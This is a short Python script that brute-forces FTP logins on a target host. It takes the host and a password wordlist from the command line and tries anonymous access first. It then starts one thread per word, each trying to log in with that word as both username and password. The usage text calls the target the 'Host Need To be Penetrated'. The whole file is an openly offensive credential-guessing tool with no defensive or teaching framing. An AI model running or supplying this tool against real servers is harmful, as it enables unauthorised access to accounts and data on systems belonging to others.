import os
import threading
import socket
import ftplib
import sys

class Ftp:
	def __init__(self):
		self.Config = {}

	def isHostOnline(self,host):
		s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		try:
			s.connect((host,21))
			return True
		except:
			return False
	def loadPassFile(self):
		Content = []
		print(" + Loading File ...")
		with open(self.Config["Wordlist"],'r') as File:
			for Word in File.readlines():
				Content.append(Word.strip())
		return Content
	def configuration(self):
		if(len(sys.argv)==3):
			print(" * Configuration In Process [ ! ]")
			if os.path.exists(sys.argv[2]):
				self.Config["host"] = sys.argv[1]
				self.Config["Wordlist"] = sys.argv[2]
				print(self.Config)
				return True
			else:
				return False
		else:
			return False

	def usage(self):
		print("\nusage : "+ sys.argv[0] + " <host> <passwordfile>.txt")
		print("\n<host> - Host Need To be Penetrated ")
		print("\n<PasswordFile> - Wordlist to be Loaded")

	def bruteForce(self,word):
		f = ftplib.FTP(self.Config["host"])
		try:
			f.login(word,word)
			print(" + Found Password And Username :",word)
			return True
		except:
			return False
	def Main(self):
		if self.configuration():
			Lst = self.loadPassFile()
			print("[ + ] Words Loaded :",len(Lst))
			print(" [ + ] Trying Anonymous Login ")
			if self.bruteForce("anonymous"):
				print(" + Anonymous Access Allowed !")
			else:
				for i in Lst:
					print(f" * Trying {i}")
					t = threading.Thread(target=self.bruteForce,args=(i,))
					t.start()
		else:
			print(" + Configuration Error")
			self.usage()

f = Ftp()
f.Main()